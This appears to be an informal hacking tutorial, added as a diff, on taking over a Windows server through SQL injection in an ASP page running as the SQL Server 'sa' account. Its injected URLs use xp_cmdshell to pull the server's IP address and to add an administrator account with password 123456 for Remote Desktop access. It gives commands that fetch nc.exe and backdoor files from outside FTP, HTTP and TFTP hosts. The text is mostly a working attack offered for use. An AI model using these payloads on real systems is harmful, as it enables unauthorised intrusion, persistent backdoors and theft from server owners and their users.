@@ -1,0 +1,93 @@
+In this article i will give u a way can control Windows server via sql inject when website run as "sa" account by connted to Remote desktop 
+ 
+ 
+http://site.com/news.asp?id=1 
+ 
+=> 
+ 
+http://site.com/news.asp?id=1' 
+ 
+Mcft OLE DB Provider for ODBC Drivers error '80040e14' 
+ 
+[Mcft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the character string ''. 
+ 
+ 
+ 
+okie, u know this site has a sql injection bug,now try it like 
+ 
+http://site.com/news.asp?id=system_user-- 
+ 
+ 
+ 
+[Mcft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'sa' to a column of data type int. 
+ 
+Oh its sa account(note that i only deal sa (or dbo) account in this article) 
+ok,continue 
+ 
+http://site.com/news.asp?id=1;drop table sin create table sin (id int identity,nd varchar(1000)) insert into sin exec master..xp_cmdshell 'ip 
+config'--sp_password 
+ 
+okie this command will create a table sin has two fields: id and nd.we will store ip address of this server in talbe sin. 
+ 
+now u can get ip by excute this link 
+ 
+http://site.com/news.asp?id=convert(int,(select top 1 nd from sin where id=1)) --sp_password 
+ 
+ 
+ 
+Mcft OLE DB Provider for SQL Server error '80040e07' 
+ 
+Syntax error converting the varchar value ' ' to a column of data type int. 
+ 
+ 
+ 
+change id=1 by 2 or 3,4 ...etc,u will see like that 
+ 
+Mcft OLE DB Provider for SQL Server error '80040e07' 
+ 
+Syntax error converting the varchar value ' IP Address. . . . . . . . . . . . : 84.45.xxx.xxx ' to a column of data type int. 
+ 
+ 
+Now open ur command and type 
+C:\nmap -sS -P0 -F -vv 84.45.xxx.xxx 
+ 
+ 
+Starting nmap 3.93 ( http://www.insecure.org/nmap ) at 2006-05-15 23:25 SE Asia Standard Time 
+Initiating SYN Stealth Scan against 84.45.xxx.xxx (84.45.xxx.xxx) [1227 ports] at 
+Discovered open port 21/tcp on 84.45.xxx.xxx 
+Discovered open port 25/tcp on 84.45.xxx.xxx 
+Discovered open port 443/tcp on 84.45.xxx.xxx 
+Discovered open port 53/tcp on 84.45.xxx.xxx 
+Discovered open port 80/tcp on 84.45.xxx.xxx 
+Discovered open port 3389/tcp on 84.45.xxx.xxx 
+ 
+Note u see the server open port 3389,i like this :D 
+Now excute some commands 
+ 
+http://site.com/news.asp?id=1;exec master..xp_cmdshell 'net user sin 123456 /add'--sp_password 
+ 
+http://site.com/news.asp?id=1;exec master..xp_cmdshell 'net localgroup administrators sin /add'--sp_password 
+ 
+I think u know whats,yes i will add sin account with password 123456 and add him in administrators group.Okie,u can login to server via remote deskto 
+p 
+(Start->programs->accessories->communications->Remote Desktop) 
+Haha,type Ip of server and connect with user name sin and password 123456.U can login in this server and do anything u want :D 
+ 
+Note:U can upload bacnkdoor to server via FTP 
+ 
+exec master..xp_cmdshell 'echo open ftp.yoursite.com > c:\ftp' --sp_password 
+exec master..xp_cmdshell 'echo user username >> c:\ftp'--sp_password 
+exec master..xp_cmdshell 'echo password >> c:\ftp'--sp_password 
+exec master..xp_cmdshell 'echo get nc.exe >> c:\ftp'--sp_password 
+exec master..xp_cmdshell 'echo quit >> c:\ftp'--sp_password 
+exec master..xp_cmdshell 'ftp -i -n -v -s:c:\ftp'--sp_password 
+exec master..xp_cmdshell 'del c:\ftp'--sp_password 
+ 
+or 
+exec master..xp_cmdshell 'get http://bvy15.net/backdoor.asp'--sp_password 
+ 
+or use TFTPD in ur computer and excute 
+ 
+;exec master..xp_cmdshell 'tftp -i 127.0.0.1 GET backdoor.exe C:\backdoor.exe'--sp_password 
+ 
+Have fun
